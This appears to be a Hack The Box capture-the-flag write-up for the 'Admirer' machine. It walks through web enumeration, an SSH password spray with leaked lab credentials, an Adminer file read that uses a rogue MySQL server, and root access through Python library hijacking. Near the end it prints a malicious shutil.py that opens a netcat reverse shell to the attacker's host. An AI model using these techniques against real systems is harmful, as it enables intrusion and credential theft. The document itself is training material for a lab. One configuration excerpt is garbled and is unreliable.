@@ -1,0 +1,594 @@
+Admirer
+
+25th September 2020 / Document No D20.100.88
+Prepared By: egre55
+Machine Author(s): polarbearer
+Difficulty: Easy
+Classification: Official
+Synopsis
+
+Admirer is an easy difficulty Linux machine that features a vulnerable version of Adminer (caused by an
+underlying MySQL protocol flaw), and an interesting Python library hijacking vector. After thorough
+enumeration, lots of pieces of information can be combined to get a foothold and then escalate privileges
+to root.
+
+Skills Required
+
+      Basic Web Enumeration
+      Basic Linux Enumeration
+
+Skills Learned
+
+      Exploiting MySQL Arbitrary File Read via Adminer
+      Python Library Hijacking
+Enumeration
+
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.168 | grep ^[0-9] | cut -d '/' -f 1 | tr
+   '\n' ',' | sed s/,$//)
+   nmap -p$ports -sC -sV 10.10.10.168
+
+Nmap reveals that ports 21 (vsftpd), 22 (OpenSSH) and 80 (Apache) are available. The Nmap script shows
+that a robots.txt is present, which contains a disallowed entry for /admin-dir . The website features some
+images.
+We're not permitted to access the /admin-dir directory, and the website source code doesn't reveal
+anything interesting.
+
+Let's enumerate any files and folders that are hosted on the web server. We can use Rustbuster for this with
+the common.txt wordlist.
+
+   wget https://github.com/phra/rustbuster/releases/download/v3.0.3/rustbuster-v3.0.3-
+   x86_64-unknown-linux-gnu -O rustbuster
+   cd /usr/share
+   git clone https://github.com/danielmiessler/SecLists/
+   ./rustbuster dir --url http://10.10.10.187/admin-dir/ --wordlist
+   /usr/share/SecLists/Discovery/Web-Content/common.txt --extensions php,txt --threads 15
+   ~ rustbuster v3.0.3 ~ by phra & ps1dr3x ~
+This reveals a contacts.txt and credentials.txt . After downloading them, we see various credentials
+and email addresses.
+
+   wget http://10.10.10.187/admin-dir/credentials.txt
+   wget http://10.10.10.187/admin-dir/contacts.txt
+
+contacts.txt
+
+   ##########
+   # admins #
+   ##########
+   # Penny
+   Email: p.wise@admirer.htb
+
+   ##############
+   # developers #
+   ##############
+   # Rajesh
+   Email: r.nayyar@admirer.htb
+
+   # Amy
+   Email: a.bialik@admirer.htb
+
+   # Leonard
+   Email: l.galecki@admirer.htb
+credentials.txt
+
+   [Internal mail account]
+   w.cooper@admirer.htb
+   fgJr6q#S\W:$P
+
+   [FTP account]
+   ftpuser
+   %n?4Wz}R$tTF7
+
+   [Wordpress account]
+   admin
+   w0rdpr3ss01!
+
+Next, we can extract the users to usernames (adding root), and save the passwords down to passwords ,
+and attempt a password spray against SSH using CrackMapExec.
+
+   cat *.txt | grep @ | sed 's/Email: //' | awk -F"@" '{print $1}' > usernames
+   cat usernames
+
+   p.wise
+   r.nayyar
+   a.bialik
+   l.galecki
+   h.helberg
+   b.rauch
+   w.cooper
+
+However, this was not successful.
+
+   crackmapexec ssh 10.10.10.187 -u usernames -p passwords
+
+   SSH 10.10.10.187 22 [*] SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u7
+   SSH 10.10.10.187 22 [-] root:fgJr6q#S\W:$P Authentication failed.
+   SSH 10.10.10.187 22 [-] root:%n?4Wz}R$tTF7 Authentication failed.
+   SSH 10.10.10.187 22 [-] root:w0rdpr3ss01! Authentication failed.
+   SSH 10.10.10.187 22 [-] p.wise:fgJr6q#S\W:$P Authentication failed.
+   SSH 10.10.10.187 22 [-] p.wise:%n?4Wz}R$tTF7 Authentication failed.
+   SSH 10.10.10.187 22 [-] p.wise:w0rdpr3ss01! Authentication failed.
+   SSH 10.10.10.187 22 [-] r.nayyar:fgJr6q#S\W:$P Authentication failed.
+   SSH 10.10.10.187 22 [-] r.nayyar:%n?4Wz}R$tTF7 Authentication failed.
+   SSH 10.10.10.187 22 [-] r.nayyar:w0rdpr3ss01! Authentication failed.
+   SSH 10.10.10.187 22 [-] a.bialik:fgJr6q#S\W:$P Authentication failed.
+   SSH 10.10.10.187 22 [-] a.bialik:%n?4Wz}R$tTF7 Authentication failed.
+   SSH 10.10.10.187 22 [-] a.bialik:w0rdpr3ss01! Authentication failed.
+   SSH 10.10.10.187 22 [-] l.galecki:fgJr6q#S\W:$P Authentication failed.
+   SSH 10.10.10.187 22 [-] l.galecki:%n?4Wz}R$tTF7 Authentication failed.
+   SSH 10.10.10.187 22 [-] l.galecki:w0rdpr3ss01! Authentication failed.
+SSH 10.10.10.187 22 [-] h.helberg:fgJr6q#S\W:$P Authentication failed.
+SSH 10.10.10.187 22 [-] h.helberg:%n?4Wz}R$tTF7 Authentication failed.
+SSH 10.10.10.187 22 [-] h.helberg:w0rdpr3ss01! Authentication failed.
+SSH 10.10.10.187 22 [-] b.rauch:fgJr6q#S\W:$P Authentication failed.
+SSH 10.10.10.187 22 [-] b.rauch:%n?4Wz}R$tTF7 Authentication failed.
+SSH 10.10.10.187 22 [-] b.rauch:w0rdpr3ss01! Authentication failed.
+SSH 10.10.10.187 22 [-] w.cooper:fgJr6q#S\W:$P Authentication failed.
+SSH 10.10.10.187 22 [-] w.cooper:%n?4Wz}R$tTF7 Authentication failed.
+SSH 10.10.10.187 22 [-] w.cooper:w0rdpr3ss01! Authentication failed.
+
+Instead, let's turn our attention to FTP, using the ftpuser credentials.
+
+ftp
+
+ftp> o
+
+(to) 10.10.10.187
+
+Connected to 10.10.10.187.
+
+220 (vsFTPd 3.0.3)
+
+Name (10.10.10.187:user): ftpuser
+
+331 Please specify the password.
+
+Password:
+
+230 Login successful.
+
+Remote system type is UNIX.
+
+Using binary mode to transfer files.
+
+ftp> passive
+
+Passive mode on.
+
+ftp> ls
+
+227 Entering Passive Mode (10,10,10,187,188,73).
+
+150 Here comes the directory listing.
+
+-rw-r--r-- 1 0          0              3405 Dec 02 2019 dump.sql
+
+-rw-r--r-- 1 0          0          5270987 Dec 03 2019 html.tar.gz
+
+226 Directory send OK.
+
+ftp> mget *
+
+mget dump.sql? y
+
+227 Entering Passive Mode (10,10,10,187,148,131).
+
+150 Opening BINARY mode data connection for dump.sql (3405 bytes).
+
+226 Transfer complete.
+
+3405 bytes received in 0.00 secs (28.2371 MB/s)
+
+mget html.tar.gz? y
+
+227 Entering Passive Mode (10,10,10,187,48,108).
+
+150 Opening BINARY mode data connection for html.tar.gz (5270987 bytes).
+
+226 Transfer complete.
+
+5270987 bytes received in 1.58 secs (3.1867 MB/s)
+
+This reveals the files dump.sql and html.tar.gz , which are downloaded.
+
+mkdir html
+tar xvf html.tar.gz --directory html/
+dump.sql doesn't seem interesting, but html.tar.gz contains a backup of the website source code, which
+contains some passwords. However, this doesn't provide us with any further access.
+
+   cd html/
+   grep -ir password
+
+The folder utility-scripts/ also contains some interesting files.
+   ls -al utility-scripts/
+The file info.php also exists on the server.
+
+The local contents of admin_tasks.php reveals the presence of the file /opt/scripts/admin_tasks.sh
+on the remote server. As seen in the source code, only options 1 to 3 are available on the
+admin_tasks.php page hosted on the server, and the output doesn't reveal anything interesting.
+
+   cat utility-scripts/admin_tasks.php
+   <html>
+   <head>
+
+      <title>Administrative Tasks</title>
+   </head>
+   <body>
+
+      <h3>Admin Tasks Web Interface (v0.01 beta)</h3>
+      <?php
+      // Web Interface to the admin_tasks script
+      //
+      if(isset($_REQUEST['task']))
+      {
+
+          $task = $_REQUEST['task'];
+          if($task == '1' || $task == '2' || $task == '3' || $task == '4' ||
+
+                $task == '5' || $task == '6' || $task == '7')
+          {
+
+   /***********************************************************************************
+                   Available options:
+                       1) View system uptime
+                       2) View logged in users
+                       3) View crontab (current user only)
+                       4) Backup passwd file (not working)
+                       5) Backup shadow file (not working)
+                       6) Backup web data (not working)
+                       7) Backup database (not working)
+                       NOTE: Options 4-7 are currently NOT working because they need root
+   privileges.
+
+                                  I'm leaving them in the valid tasks in case I figure out a way
+                                  to securely run code as root from a PHP page.
+   ************************************************************************************/
+              echo str_replace("\n", "<br />", shell_exec("/opt/scripts/admin_tasks.sh $task
+   2>&1"));
+          }
+          else
+          {
+              echo("Invalid task.");
+          }
+      }
+      ?>
+
+It doesn't seem vulnerable to command injection due to the whitelist of permitted options. Let's turn our
+attention to enumerating this directory on the server. Maybe there are other files hosted there that weren't
+in the backup.
+
+Using Rustbuster, and after a trying a few different wordlists, the SecLists big.txt wordlist identifies the file
+adminer.php .
+Foothold
+
+After navigating to this page, we find that the version of Adminer is 4.6.2. Adminer is a MYSQL database
+management tool, and we are able to input the connection details, including the server name.
+
+After researching online, it seems that Admirer 4.6.2 is prone to a arbitrary file disclosure vulnerability,
+owing to an underlying MySQL protocol flaw.
+In order to exploit this, we need to configure a MySQL server on an accessible machine under our control,
+containing a database, table and single column. First, we can search for the latest version of the MariaDB
+package (correct for Parrot OS at the time of writing).
+
+If the MySQL or MariaDB server and client aren't already installed, issue the commands below.
+   apt install mariadb-server-10.3 mariadb-client-10.3
+   systemctl start mariadb
+
+The MariaDB root password isn't set by default, so we set it to something non-guessable.
+   mysql -u root -p
+   ALTER USER 'root'@'localhost' IDENTIFIED BY '<YOUR PASSWORD>';
+
+Next, we can create a database, and a lower-privileged user that can be used to connect to it remotely. Note
+that we specify backup@10.10.10.187 , as backup@localhost would be a different user, and wouldn't be
+able to connect from 10.10.10.187.
+
+   CREATE DATABASE backup; USE backup; CREATE TABLE backup (name VARCHAR(2000));
+   CREATE USER 'backup'@'10.10.10.187' IDENTIFIED BY '<YOUR PASSWORD>';
+   GRANT ALL PRIVILEGES ON backup.* TO 'backup'@'10.10.10.187';
+Next, add an exception in the firewall policy to allow connections from 10.10.10.187 to port 3306 locally.
+   ufw allow from 10.10.10.187 to any port 3306
+We now need to configure MariaDB to bind to our tun0 VPN address. Issue the command below to identify
+the MySQL configuration files.
+
+   mysqld --help --verbose | less
+
+   mysqld Ver 10.3.23-MariaDB-1 for debian-linux-gnu on x86_64 (Debian buildd-unstable)
+   Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+   Starts the MariaDB database server.
+
+   Usage: mysqld [OPTIONS]
+
+   Default options are read from the following files in the given order:
+   /etc/my.cnf /etc/mysql/my.cnf ~/.my.cnf
+
+The file /etc/mysql/my.cnf includes configuration files in the directory /etc/mysql/mariadb.conf.d/ .
+
+   pico /etc/mysql/my.cnf
+
+   # The MariaDB configuration file
+   #
+   # The MariaDB/MySQL tools read configuration files in the following order:
+   # 1. "/etc/mysql/mariadb.cnf" (this file) to set global defaults,
+   # 2. "/etc/mysql/conf.d/*.cnf" to set global options.
+   # 3. "/etc/mysql/mariadb.conf.d/*.cnf" to set MariaDB-only options.
+   # 4. "~/.my.cnf" to set user-specific options.
+   #
+   # If the same option is defined multiple times, the last one will apply.
+   #
+   # One can use all long options that the program supports.
+   # Run program with --help to get a list of available options and with
+   # --print-defaults to see which it would actually understand and use.
+
+   #
+   # This group is read both both by the client and the server
+   # use it for options that affect everything
+   #
+   [client-server]
+
+   # Import all .cnf files from configuration directory
+   !includedir /etc/mysql/conf.d/
+   !includedir /etc/mysql/mariadb.conf.d/
+
+This contains the server configuration file 50-server.cnf .
+ls -al /etc/mysql/mariadb.conf.d/
+
+total 16
+drwxr-xr-x 1 root root 128 Sep 24 00:46 .
+drwxr-xr-x 1 root root 148 Sep 24 00:47 ..
+-rw-r--r-- 1 root root 733 Jul 5 08:07 50-client.cnf
+-rw-r--r-- 1 root root 336 Jul 5 08:07 50-mysql-clients.cnf
+-rw-r--r-- 1 root root 1032 Jul 5 08:07 50-mysqld_safe.cnf
+-rw-r--r-- 1 root root 3940 Jul 5 08:07 50-server.cnf
+
+Change the bind-address value to your tun0 IP address.
+
+pico /etc/mysql/mariadb.conf.d/50-server.cnf
+
+[mysqld]
+
+#                       = mysql
+# * Basic Settings      = /run/mysqld/mysqld.pid
+#                       = /run/mysqld/mysqld.sock
+user                    = 3306
+pid-file                = /usr
+socket                  = /var/lib/mysql
+#port                   = /tmp
+basedir                 = /usr/share/mysql
+datadir
+tmpdir
+lc-messages-dir
+#skip-external-locking
+
+# Instead of skip-networking the default is now to listen only on
+
+# localhost which is more compatible and is not less secure.
+
+bind-address            = 10.10.14.2
+
+Restart the MariaDB server and check that the service is listening on the correct IP address.
+
+systemctl restart mariadb
+netstat -pano | less
+Next, specify the connection details on the Adminer page and click Login .
+
+Recalling the file /opt/scripts/admin_tasks.sh that we identified previously, we attempt to read it.
+   LOAD DATA LOCAL INFILE '/opt/scripts/admin_tasks.sh'
+   INTO TABLE backup.backup
+   FIELDS TERMINATED BY "\n"
+
+However, we receive the error above, owing to an open_basedir restriction. On checking the previously
+identified phpinfo file, we can see that the permitted open_basedir directory on the server is
+/var/www/html . Further, we recall that the backup of the index.php file contained credentials. Let's
+attempt to read this file. A ../ is specified, as we are currently in the utility-scripts/ directory.
+
+The query was successful. Next, click the select link on the left-hand side to view the file.
+This displays the index.php. On scrolling down, we find SQL connection details.
+
+Password reuse is very common, and it this case the credentials also work for SSH as waldo uses the same
+password for SQL and system accounts.
+Privilege Escalation
+
+The first thing to check is common privilege escalation vectors. We can automate this using LinPEAS.
+   wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-
+   scripts-suite/master/linPEAS/linpeas.sh
+   python3 -m http.server 80
+   ufw allow from 10.10.10.187 to any port 80
+
+Download the script to the server and run it.
+   cd /dev/shmy
+   wget 10.10.14.2/linpeas.sh
+   bash ./linpeas.sh
+
+This reveals that the root-owned file /opt/scripts/backup.py is readable by a group we are a member of.
+   #!/usr/bin/python3
+   from shutil import make_archive
+   src = '/var/www/html/'
+   # old ftp directory, not used anymore
+   #dst = '/srv/ftp/html'
+   dst = '/var/backups/html'
+   make_archive(dst, 'gztar', src)
+
+This is a simple script that imports a library called shutil . Next, let's examine the file
+/opt/scripts/admin_tasks.sh .
+
+   cat /opt/scripts/admin_tasks.sh
+If our effective user ID is 0 i.e. root, then we are permitted to run various backup tasks. Interestingly, the
+backup_web() function will run the backup.py file.
+
+   #!/bin/bash
+
+   view_uptime()
+   {
+
+          /usr/bin/uptime -p
+   }
+
+   view_users()
+   {
+
+          /usr/bin/w
+   }
+
+   view_crontab()
+   {
+
+          /usr/bin/crontab -l
+   }
+
+   backup_passwd()
+   {
+
+          if [ "$EUID" -eq 0 ]
+          then
+
+                 echo "Backing up /etc/passwd to /var/backups/passwd.bak..."
+                 /bin/cp /etc/passwd /var/backups/passwd.bak
+                 /bin/chown root:root /var/backups/passwd.bak
+                 /bin/chmod 600 /var/backups/passwd.bak
+                 echo "Done."
+          else
+                 echo "Insufficient privileges to perform the selected operation."
+          fi
+   }
+
+   backup_shadow()
+   {
+
+          if [ "$EUID" -eq 0 ]
+          then
+
+                 echo "Backing up /etc/shadow to /var/backups/shadow.bak..."
+                 /bin/cp /etc/shadow /var/backups/shadow.bak
+                 /bin/chown root:shadow /var/backups/shadow.bak
+                 /bin/chmod 600 /var/backups/shadow.bak
+                 echo "Done."
+          else
+                 echo "Insufficient privileges to perform the selected operation."
+          fi
+   }
+
+   backup_web()
+{
+       if [ "$EUID" -eq 0 ]
+       then
+              echo "Running backup script in the background, it might take a while..."
+              /opt/scripts/backup.py &
+       else
+              echo "Insufficient privileges to perform the selected operation."
+       fi
+
+}
+
+backup_db()
+{
+
+       if [ "$EUID" -eq 0 ]
+       then
+
+              echo "Running mysqldump in the background, it may take a while..."
+              #/usr/bin/mysqldump -u root admirerdb > /srv/ftp/dump.sql &
+              /usr/bin/mysqldump -u root admirerdb > /var/backups/dump.sql &
+       else
+              echo "Insufficient privileges to perform the selected operation."
+       fi
+}
+
+# Non-interactive way, to be used by the web interface
+if [ $# -eq 1 ]
+then
+
+       option=$1
+       case $option in
+
+              1) view_uptime ;;
+              2) view_users ;;
+              3) view_crontab ;;
+              4) backup_passwd ;;
+              5) backup_shadow ;;
+              6) backup_web ;;
+              7) backup_db ;;
+
+              *) echo "Unknown option." >&2
+       esac
+
+       exit 0
+fi
+
+# Interactive way, to be called from the command line
+options=("View system uptime"
+
+                "View logged in users"
+                "View crontab"
+                "Backup passwd file"
+                   "Backup shadow file"
+                   "Backup web data"
+                   "Backup DB"
+                   "Quit")
+   echo
+   echo "[[[ System Administration Menu ]]]"
+   PS3="Choose an option: "
+   COLUMNS=11
+   select opt in "${options[@]}"; do
+          case $REPLY in
+                 1) view_uptime ; break ;;
+                 2) view_users ; break ;;
+                 3) view_crontab ; break ;;
+                 4) backup_passwd ; break ;;
+                 5) backup_shadow ; break ;;
+                 6) backup_web ; break ;;
+                 7) backup_db ; break ;;
+                 8) echo "Bye!" ; break ;;
+                 *) echo "Unknown option." >&2
+          esac
+   done
+   exit 0
+
+On inspecting our sudo permissions, it's found that we can run the script admin_tasks.sh as root.
+Furthermore, the SETENV option is specified, which allows us to change or add an environment variable.
+
+This combination of configurations inadvertently presents a privilege escalation opportunity. We can create
+a Python library that defines the make_archive function that the script is expecting, and attempt to hijack
+script execution. Save the contents below to /dev/shm/shutil.py .
+   import os
+
+   def make_archive(h, t, b):
+                 os.system('nc 10.10.14.3 8000 -e "/bin/bash"')
+
+Next, allow the server to connect to us remotely on this port, and stand up a listener.
+
+   ufw allow from 10.10.10.187 to any port 8000
+   nc -lvnp 8000
+
+Finally, we can attempt to run the script.
+
+   sudo /opt/scripts/admin_tasks.sh
+
+This doesn't work, because Python doesn't know to look for our malicious shutil.py in /dev/shm .
+Reading the documentation, it seems that we can specify a PYTHONPATH variable, that functions much the
+same as the PATH variable.
+This variable is specified, and the command is run again, with the sudo -E switch used to preserve the
+environment.
+
+   waldo@admirer:/dev/shm$ PYTHONPATH=/dev/shm
+   waldo@admirer:/dev/shm$ sudo -E /opt/scripts/admin_tasks.sh
+   [sudo] password for waldo:
+
+   [[[ System Administration Menu ]]]
+   1) View system uptime
+   2) View logged in users
+   3) View crontab
+   4) Backup passwd file
+   5) Backup shadow file
+   6) Backup web data
+   7) Backup DB
+   8) Quit
+   Choose an option: 6
+   Running backup script in the background, it might take a while...
+
+However, this is still unsuccessful. After some research online (or by consulting the sudo documentation),
+we find that it is necessary to pass this variable directly to sudo. The option 6 can be provided as a
+positional argument.
+
+   sudo PYTHONPATH=/dev/shm /opt/scripts/admin_tasks.sh 6
+This is successful, and a reverse shell as root is caught.
+
